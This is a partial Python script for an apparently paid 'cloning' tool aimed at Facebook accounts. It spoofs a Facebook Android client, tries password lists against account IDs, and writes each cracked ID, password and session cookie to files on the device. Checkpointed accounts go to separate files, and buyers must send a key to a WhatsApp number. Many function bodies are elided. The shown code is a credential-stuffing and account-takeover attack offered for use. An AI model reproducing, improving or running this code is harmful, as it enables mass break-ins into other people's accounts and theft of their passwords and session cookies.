...
xxxx=[FBAN/FB4A;FBAV/256.0.0.5.154;FBBV/638991666;FBDM/{density=3.3,width=1080,height=1462};FBLC/cs_CZ;FBRV/362728683;FBCR/Banglalink;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/MI 8 Lite;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
folder_path = '/sdcard/Mehadi'
try:
...
def clear():
        ...
        print(logo)
##------------(LOGO)------------##
#os.system("xdg-open https://www.facebook.com/abbu.mehadi.520")
logo=(f"""{A}
         {A}888b     d888          888                    888 d8b      
      {G}8888b   d8888          888                    888 Y8P      
      {A}88888b.d88888          888                    888          
      {G}888Y88888P888  .d88b.  88888b.   8888b.   .d88888 888      
      {A}888 Y888P 888 d8P  Y8b 888 "88b     "88b d88" 888 888      
      {G}888  Y8P  888 88888888 888  888 .d888888 888  888 888      
      {A}888   "   888 Y8b.     888  888 888  888 Y88b 888 888      
      {G}888       888  "Y8888  888  888 "Y888888  "Y88888 888      
{R}--------------------------------------------------
{R}❲{G}~{R}❳{G} DEVELOPER {R}:{G} 𝐌𝐝 𝐌𝐞𝐡𝐚𝐝𝐢 𝐒𝐚𝐫𝐤𝐚𝐫 
{R}❲{G}~{R}❳{G} VERSION   {R}:{G} 1.0
{R}❲{G}~{R}❳{G}  STATUS    {R}:{G}  𝐏𝐚𝐢𝐝
{R}❲{G}~{R}❳{G}  TOOLS     {R}:{G}  Random+File 
{R}--------------------------------------------------""")
##---------------APPROVAL------------##
def approval():
  clear()
  ...
  try:
    ...
    if id in httpCaht:
      ...
      print(f'{R}❲{G}1{R}❳{G} Your Key {R}:{G} Mehadi=['+id+']=XD')
      linex()
      print(f"{R}❲{G}1{R}❳{G} This Is Paid Tool ")
      linex()
      input(f'{R}❲{G}1{R}❳{G} Click Enter To Sent Key Admin WhatsApp ')
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('am start https://wa.me/+88010606777866?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
...
def file():
    clear();print(f"{R}❲{G}~{R}❳{G} Example {R}:{R} /{G}sdcard{R}/{G}Mehadi.txt {R}❲{G}ETC{R}❳{G}");linex()
    ...
    print(f"{R}❲{G}~{R}❳{G} Cloning Accounts Saved in /sdcard/Mehadi_M1_FILE_OK.txt")
    print(f'\r{R}--------------------------------------------------')
...
def gmail():
                ...
                clear()
                print(f'{R}❲{G}~{R}❳{G} Example {R}:{G} Chadni {R}|{G} Nurnobi {R}|{G} Sompa {R}|{G} Mehadi');linex()
...
def rd1(ids,passlist):
    try:
        ...
        sys.stdout.write(f'\r{R}❲{G}𝐌𝐚𝐡𝐚𝐝𝐢 -𝐗𝐃{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        for pas in passlist:
                ...
                if 'session_key' in po:
                        ...
                        status= lock(uid)
                        if "Active" in status:
                        	print(f'\r{R}❲{G}𝐌𝐚𝐡𝐚𝐝𝐢 -𝐗𝐃{R}❳{G} '+uid+f' {R}|{G} '+pas)
                        print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                        file_path_ok = os.path.join(folder_path, 'Mehadi-RANDOM-OK.txt')
                        file_path_cookies = os.path.join(folder_path, 'Mehadi-RANDOM-COOKIE.txt')
                        ...
                        print(f'\r{R}❲{Y}𝐌𝐚𝐡𝐚𝐝𝐢-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                        file_path = os.path.join(folder_path, 'Mehadi-RANDOM-CP.txt')
...
def api1(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}Mehadi-T1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G} I𝐌𝐚𝐡𝐚𝐝𝐢-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'Mehadi-FILE-M1-OK.txt')
                    open('/sdcard/XD/Mehadi-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}𝐌𝐚𝐡𝐚𝐝𝐢-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'Mehadi-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
...
def api2(ids,names,passlist):
    try:
        global ok,loop,sim_id
        sys.stdout.write(f'\r{R}❲{G}Mehadi-T2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}❳{A}-{R}❲{G}%s{R}❳ \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G}𝐌𝐚𝐡𝐚𝐝𝐢-OK{R}❳ '+uid+f' {R}|{G} '+pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'Mehadi-FILE-M2-OK.txt')
                    open('/sdcard/XD/Mehadi-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    file_path = os.path.join(folder_path, 'Mehadi-FILE-M2-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
